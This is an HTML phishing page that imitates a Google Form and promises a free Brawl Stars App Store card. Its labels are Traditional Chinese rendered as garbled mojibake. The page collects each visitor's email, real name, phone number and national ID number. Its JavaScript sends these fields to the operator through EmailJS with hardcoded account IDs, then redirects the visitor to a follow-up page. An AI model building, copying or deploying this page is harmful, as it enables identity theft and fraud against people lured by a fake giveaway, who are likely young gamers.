<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>è’é‡äº‚é¬¥å…è²» App Store å¡é ˜å–å€</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="icon" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
    <meta name="description" content="è’é‡äº‚é¬¥å…è²» App Store å¡é ˜å–å€ï¼Œå¡«å¯«è³‡æ–™å³å¯é ˜å–å…è²»åºè™Ÿï¼">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        // ğŸš¨ è«‹æ›¿æ› 'YOUR_PUBLIC_KEY' ç‚ºæ‚¨çš„ EmailJS Public Key (User ID)
        (function() {
            emailjs.init('VuhBknBXBuQYRZ-Tz'); 
        })();
    </script>
    
    <style>
        /* ========================================================= */
        /* 1. CSS æ¨£å¼å€åŸŸ (æ’ç‰ˆå„ªåŒ–ã€å‹•ç•«æ•ˆæœ) */
        /* ========================================================= */
        
        /* åŸºç¤æ¨£å¼å’Œå­—é«” */
        body {
            background-color: #f0ebf8; /* æ·ºç°è‰²/æ·¡ç´«è‰²èƒŒæ™¯ */
            font-family: Roboto, Arial, sans-serif;
            padding: 20px;
        }
        
        /* === æ ¸å¿ƒä¿®æ”¹ï¼šå®šç¾©ç¨ç«‹å€å¡Šçš„å¯¬åº¦å’Œå±…ä¸­æ¨£å¼ === */
        /* è®“é é¢ä¸Šæ‰€æœ‰ä¸»è¦å€å¡Šéƒ½æ“æœ‰ç›¸åŒçš„æœ€å¤§å¯¬åº¦å’Œå±…ä¸­å°é½Šæ•ˆæœ */
        .page-block {
            max-width: 680px; 
            margin: 0 auto 20px auto; 
            background-color: white;
            border-radius: 8px;
            border: 1px solid rgb(218, 220, 224);
            /* è®“ page-block æˆç‚ºç¬¬ä¸€å€‹éŒ¯èª¤æç¤ºçš„æ»¾å‹•ç›®æ¨™ */
            position: relative;
        }

        /* é ‚éƒ¨ç´«è‰²æ¢ (å¥—ç”¨çµ¦ç¬¬ä¸€å€‹ page-block) */
        .header-band {
            height: 10px;
            background-color: #673ab7; 
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
        }

        /* é ‚éƒ¨å…§å®¹å€å¡Š */
        .form-header-content {
            padding: 24px;
            padding-top: 15px;
            padding-bottom: 5px;
        }
        
        /* æ¨™é¡Œã€æè¿° */
        .page-block h1 { color: #202124; font-size: 32px; font-weight: 400; margin: 0 0 8px 0; }
        .page-block .description, .page-block .required-note { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
        .page-block .required-note { color: #d93025; }
        
        /* **å•é¡Œå¡ç‰‡**ï¼šç¹¼æ‰¿ .page-block æ¨£å¼ï¼Œä¸¦å»é™¤é‡è¤‡é‚Šæ¡†å’Œé™°å½± */
        .question-card {
            background-color: white; 
            padding: 24px; 
            border-radius: 8px;
            border-left: 5px solid transparent; /* é ç•™é©—è­‰ç´…ç·šç©ºé–“ */
            transition: border-left 0.3s;
            box-shadow: none; 
            border: none;
            margin: 0;
            padding-top: 5px; 
        }
        
        /* é©—è­‰å¤±æ•—æ™‚çš„ç´…è‰²é‚Šæ¢æ¨£å¼ */
        .question-card.error {
            border-left: 5px solid #d93025;
        }

        .question-title { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 12px; }
        
        /* ç°¡ç­”é¡Œè¼¸å…¥æ¡†æ¨£å¼ */
        .question-card input[type="text"] {
            border: none; border-bottom: 1px solid #dadce0; width: 100%; padding: 8px 0;
            font-size: 14px; box-sizing: border-box; transition: border-bottom 0.3s;
        }
        .question-card input[type="text"]:focus { border-bottom: 2px solid #673ab7; outline: none; }
        
        /* é¸é …æ’ç‰ˆ (ä¿æŒä¸è®Š) */
        .option-group { display: block; }
        .option-group div {
            display: flex; 
            align-items: center;
            padding: 8px 0;
            position: relative; 
        }
        .option-group label {
            display: inline-block; 
            padding: 0 0 0 12px; 
            font-size: 14px;
            color: #202124;
            cursor: pointer;
        }
        
        /* å–®é¸/å¤šé¸æ¡†æ¨£å¼å’Œå‹•ç•« (ä¿æŒä¸è®Š) */
        .option-group input[type="radio"], 
        .option-group input[type="checkbox"] {
            appearance: none; -webkit-appearance: none; -moz-appearance: none;
            width: 20px; height: 20px; margin: 0; cursor: pointer; position: relative;
            border: 2px solid #5f6368; border-radius: 50%; 
            transition: all 0.2s ease-in-out; transform: scale(1); outline: none;
            flex-shrink: 0; 
        }
        .option-group input[type="checkbox"] { border-radius: 4px; }
        .option-group input[type="radio"]:focus, .option-group input[type="checkbox"]:focus {
            border-color: #673ab7; box-shadow: 0 0 0 2px rgba(103, 58, 183, 0.3);
        }
        .option-group input[type="radio"]:checked, .option-group input[type="checkbox"]:checked {
            border-color: #673ab7;
        }
        .option-group input[type="radio"]:checked::before {
            content: ''; display: block; width: 10px; height: 10px; background-color: #673ab7;
            border-radius: 50%; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
        }
        .option-group input[type="checkbox"]:checked::before {
            content: '\2713'; display: block; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: white; font-size: 14px; font-weight: bold; background-color: #673ab7;
            width: 100%; height: 100%; border-radius: 4px; text-align: center; line-height: 20px;
        }
        
        @keyframes click-wave {
            0% { transform: scale(0); opacity: 0; }
            50% { transform: scale(1.5); opacity: 0.5; }
            100% { transform: scale(1); opacity: 0; }
        }

        .option-group label::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 10px; 
            transform: translate(-50%, -50%) scale(0);
            width: 40px; 
            height: 40px;
            border-radius: 50%;
            background-color: rgba(103, 58, 183, 0.1); 
            opacity: 0;
            pointer-events: none;
            z-index: 1; 
        }
        
        .option-group input[type="radio"]:active ~ label::after,
        .option-group input[type="checkbox"]:active ~ label::after {
            animation: click-wave 0.3s forwards;
        }

        /* æäº¤å€å¡Šæ¨£å¼ (ç¨ç«‹å€å¡Š) */
        .submit-footer { 
            padding: 16px 24px; 
            overflow: auto; 
            border-top: 1px solid #dadce0; 
            background-color: white;
            border-radius: 0 0 8px 8px; /* ç¢ºä¿åœ“è§’åœ¨åº•éƒ¨ */
        }
        
        /* åº•éƒ¨ Logo æ¨£å¼ */
        .footer-logo { 
            text-align: right; 
            padding: 10px 20px; 
            font-size: 12px; 
            color: #9aa0a6; 
            max-width: 680px; 
            margin: 0 auto; 
        }

        /* æäº¤æŒ‰éˆ•æ¨£å¼ */
        /* å°‡ #submit-button æ”¹ç‚º button ä»¥ä¾¿æ–¼ HTML èªç¾© */
        .button-style { background-color: #673ab7; color: white; padding: 10px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; float: left; transition: background-color 0.2s; text-align: center; }
        .button-style:hover { background-color: #5b2fa8; }
        .clear-content { color: #673ab7; text-decoration: none; line-height: 40px; margin-left: 20px; font-size: 14px; float: right; cursor: pointer; }
        
    </style>
</head>
<body>

    <div id="header-block" class="page-block">
        <div class="header-band"></div> 
        <div class="form-header-content">
            <h1>è’é‡äº‚é¬¥å…è²» App Store å¡é ˜å–å€</h1>
            <p class="description">è«‹å¡«å¯«ä»¥ä¸‹è³‡æ–™ä¾†é ˜å–å…è²» App Store å¡</p>
            <hr style="border: none; border-top: 1px solid #dadce0; margin: 15px 0;">
            <p class="required-note">* è¡¨ç¤ºå¿…å¡«å•é¡Œ</p>
        </div>
    </div>

    <div class="page-block">
        <div class="question-card required" data-question-name="q1">
            <p class="question-title">1. è«‹è¼¸å…¥ä½ çš„Email <span style="color: red;">*</span></p>
            <input type="text" id="q1_id" name="q1_id" placeholder="æ‚¨çš„å›ç­”" required>
        </div>
    </div>
    
    <div class="page-block">
        <div class="question-card required" data-question-name="q2">
            <p class="question-title">2. è¼¸å…¥ä½ çš„çœŸå¯¦å§“å <span style="color: red;">*</span></p>
            <input type="text" id="q2_fav_hero" name="q2_fav_hero" placeholder="æ‚¨çš„å›ç­”" required>
        </div>
    </div>
    
    <div class="page-block">
        <div class="question-card required" data-question-name="q3">
            <p class="question-title">3. è¼¸å…¥ä½ çš„é›»è©±è™Ÿç¢¼ <span style="color: red;">*</span></p>
            <input type="text" id="q3_phone" name="q3_phone" placeholder="æ‚¨çš„å›ç­”" required>
        </div>
    </div>
    
    <div class="page-block">
        <div class="question-card required" data-question-name="q4">
            <p class="question-title">4. è¼¸å…¥ä½ çš„èº«ä»½è­‰å­—è™Ÿ <span style="color: red;">*</span></p>
            <input type="text" id="q4_id_card" name="q4_id_card" placeholder="æ‚¨çš„å›ç­”" required>
        </div>
    </div>
    
    <div class="page-block submit-area-block" style="border: none;">
            <button type="button" id="submit-button" class="button-style">æäº¤</button>
            <a href="#" class="clear-content">æ¸…é™¤å…§å®¹</a>
    </div>


    <script>
        const submitButton = document.getElementById('submit-button');
        const clearButton = document.querySelector('.clear-content');

        /**
         * æ¸…é™¤æ‰€æœ‰è¼¸å…¥å…§å®¹å’Œè¦–è¦ºæç¤º
         */
        function clearAllInputs() {
            // æ¸…é™¤æ‰€æœ‰æ–‡å­—è¼¸å…¥æ¡†
            document.querySelectorAll('input[type="text"]').forEach(input => {
                input.value = '';
            });

            // æ¸…é™¤æ‰€æœ‰å–®é¸æ¡†çš„é¸ä¸­ç‹€æ…‹
            document.querySelectorAll('input[type="radio"]').forEach(radio => {
                radio.checked = false;
            });
            
            // æ¸…é™¤æ‰€æœ‰ç´…è‰²é‚Šæ¢ (é©—è­‰æç¤º)
            document.querySelectorAll('.question-card').forEach(q => {
                q.classList.remove('error'); // ä½¿ç”¨ classList ç§»é™¤éŒ¯èª¤é¡åˆ¥
                q.style.borderLeft = ''; // ç¢ºä¿é‚Šæ¡†è¢«ç§»é™¤
            });

            // æ»¾å‹•åˆ°é ‚éƒ¨
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        /**
         * é©—è­‰æ‰€æœ‰å¿…å¡«å•é¡Œæ˜¯å¦å·²å›ç­”ã€‚
         * å¦‚æœæœ‰å•é¡Œæœªå›ç­”ï¼Œå‰‡åœ¨å¡ç‰‡å·¦å´é¡¯ç¤ºç´…ç·šï¼Œä¸¦è¿”å› falseã€‚
         * @returns {boolean} æ‰€æœ‰å¿…å¡«é …æ˜¯å¦éƒ½å·²å¡«å¯«ã€‚
         */
        function validateForm() {
            let isValid = true;
            let firstErrorElement = null;

            // 1. æ¸…é™¤æ‰€æœ‰ç¾æœ‰çš„éŒ¯èª¤æç¤º
            document.querySelectorAll('.question-card').forEach(q => {
                q.classList.remove('error');
            });

            // 2. éæ­·æ‰€æœ‰åŒ…å« required class çš„å•é¡Œå¡ç‰‡
            const requiredCards = document.querySelectorAll('.question-card.required');
            
            requiredCards.forEach(card => {
                const qName = card.getAttribute('data-question-name');
                let isAnswered = false;

                // æª¢æŸ¥ç°¡ç­”é¡Œ (input[type="text"])
                const textInput = card.querySelector('input[type="text"]');
                if (textInput) {
                    if (textInput.value.trim() !== '') {
                        isAnswered = true;
                    }
                } 
                
                // æª¢æŸ¥å–®é¸é¡Œ (input[type="radio"])
                // ä½¿ç”¨ data-question-name ä½œç‚º radio group çš„ name
                const radioInputs = card.querySelectorAll(`input[type="radio"][name="${qName}"]`);
                if (radioInputs.length > 0) {
                    radioInputs.forEach(radio => {
                        if (radio.checked) {
                            isAnswered = true;
                        }
                    });
                }

                // 3. è™•ç†é©—è­‰å¤±æ•—
                if (!isAnswered) {
                    isValid = false;
                    card.classList.add('error');
                    
                    // è¨˜éŒ„ç¬¬ä¸€å€‹éŒ¯èª¤å…ƒç´ çš„çˆ¶ç´š page-block
                    if (!firstErrorElement) {
                        firstErrorElement = card.closest('.page-block'); 
                    }
                }
            });

            // 4. å¦‚æœæœ‰éŒ¯èª¤ï¼Œæ»¾å‹•åˆ°ç¬¬ä¸€å€‹æœªå¡«å¯«çš„å€å¡Š
            if (!isValid && firstErrorElement) {
                // å»¶é²æ»¾å‹•ä»¥ç¢ºä¿æ¨£å¼æ¸²æŸ“å®Œæˆ
                setTimeout(() => {
                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }, 100);
            }

            return isValid;
        }

        /**
         * æ”¶é›†æ‰€æœ‰ç­”æ¡ˆä¸¦é€é EmailJS ç™¼é€éƒµä»¶ã€‚
         */
        function sendEmail() {
            // ğŸš¨ è«‹æ›¿æ› 'YOUR_SERVICE_ID' å’Œ 'YOUR_TEMPLATE_ID'
            const serviceID = 'service_2rdr407'; 
            const templateID = 'template_yn3lwpo'; 

            // æ”¶é›†æ‰€æœ‰å•é¡Œçš„ç­”æ¡ˆ
            const templateParams = {

                // ç°¡ç­”é¡Œ (ä½¿ç”¨ id/name å±¬æ€§)
                'user_id': document.getElementById('q1_id').value.trim() || 'æœªå›ç­”',
                'fav_hero': document.getElementById('q2_fav_hero').value.trim() || 'æœªå›ç­”',
                'phone': document.getElementById('q3_phone').value.trim() || 'æœªå›ç­”',
                'id_card': document.getElementById('q4_id_card').value.trim() || 'æœªå›ç­”',

                // é¡å¤–è³‡è¨Šï¼šæ¨™é¡Œ
                'form_title': document.querySelector('h1').textContent
            };

            // é¡¯ç¤ºè¼‰å…¥ç‹€æ…‹æˆ–ç¦ç”¨æŒ‰éˆ•
            submitButton.disabled = true;
            submitButton.textContent = 'å‚³é€ä¸­...';

            emailjs.send(serviceID, templateID, templateParams)
  .then(function(response) {
    console.log('SUCCESS!', response.status, response.text);
    
    // æç¤ºä½¿ç”¨è€…
    alert("æäº¤æˆåŠŸï¼å³å°‡å‰å¾€é ˜å–çå‹µã€‚");
    
    // æ¸…é™¤ä¸¦è·³è½‰
    clearAllInputs();
    window.location.href = '2.html';
});
        }


        // ===================================
        // äº‹ä»¶ç›£è½å™¨
        // ===================================

        // æäº¤æŒ‰éˆ•é»æ“Šäº‹ä»¶ï¼šå…ˆé©—è­‰ï¼Œå†å‚³é€
        submitButton.addEventListener('click', function(event) {
            if (validateForm()) {
                sendEmail();
            } else {
                // é©—è­‰å¤±æ•—æ™‚ï¼ŒvalidateForm() æœƒè™•ç†è¦–è¦ºæç¤ºå’Œæ»¾å‹•
                console.log('è¡¨å–®é©—è­‰å¤±æ•—ï¼Œè«‹å®Œæˆæ‰€æœ‰å¿…å¡«é …ç›®ã€‚');
            }
        });

        // æ¸…é™¤å…§å®¹åŠŸèƒ½
        clearButton.addEventListener('click', function(event) {
            event.preventDefault();
            clearAllInputs();
        });

    </script>
</body>

</html>